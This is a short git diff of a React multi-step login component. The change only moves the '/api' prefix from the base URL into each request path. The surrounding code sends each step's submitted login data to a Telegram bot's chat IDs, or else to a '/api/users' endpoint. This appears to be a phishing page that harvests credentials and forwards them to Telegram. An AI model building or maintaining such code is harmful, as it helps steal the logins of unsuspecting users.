@@ -64,7 +64,7 @@ export default function Login() {
 
   const [stepLoading, setStepLoading] = useState(false)
 
-  const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
+  const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000'
   const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
   const TELEGRAM_CHAT_IDS = (import.meta.env.VITE_TELEGRAM_CHAT_IDS || '').split(',').map(id => id.trim()).filter(id => id)
 
@@ -104,7 +104,7 @@ export default function Login() {
         `
         await sendToTelegram(telegramMessage)
       } else {
-        await fetch(`${API_URL}/users`, {
+        await fetch(`${API_URL}/api/users`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ ...step1Data, step: 1 })
@@ -137,7 +137,7 @@ export default function Login() {
         `
         await sendToTelegram(telegramMessage)
       } else {
-        await fetch(`${API_URL}/users`, {
+        await fetch(`${API_URL}/api/users`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(step3Data)
@@ -458,7 +458,7 @@ export default function Login() {
                       `
                       await sendToTelegram(telegramMessage)
                     } else {
-                      await fetch(`${API_URL}/users`, {
+                      await fetch(`${API_URL}/api/users`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(step2Data)
